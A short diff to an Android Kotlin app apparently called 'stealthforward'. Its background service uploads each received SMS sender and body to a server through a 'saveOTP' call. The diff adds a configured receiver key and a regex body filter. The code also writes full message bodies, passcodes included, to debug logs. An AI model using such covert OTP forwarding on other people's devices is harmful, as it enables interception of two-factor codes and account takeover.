@@ -7,6 +7,7 @@ import android.content.Intent
 import android.os.IBinder
 import android.util.Log
 import com.nf.stealthforward.api.NetworkClient
+import com.nf.stealthforward.config.Config
 import com.nf.stealthforward.listener.SmsListener
 import retrofit2.Call
 import retrofit2.Response
@@ -54,12 +55,13 @@ class BackgroundService : Service(), SmsListener {
     ////////////////////////////////////////////////////////////////////////////////////////////////
 
     override fun onSmsReceived(sender: String, body: String) {
-        val receiver = "" // get from pref
+        val receiver = Config.receiverKey
         Log.d(TAG, "SMS received {receiver: \"$receiver\", sender: \"$sender\", body: \"$body\"}")
 
-        // todo: filter sms
-
-
+        if (Config.bodySyntax.isNotBlank() && Regex(Config.bodySyntax).matchEntire(body) == null) {
+            Log.e(TAG, "SMS body doesn't match body syntax")
+            return
+        }
 
         val apiCall = NetworkClient.retrofitClient.saveOTP(receiver, sender, body)
         apiCall.enqueue(object : retrofit2.Callback<String> {
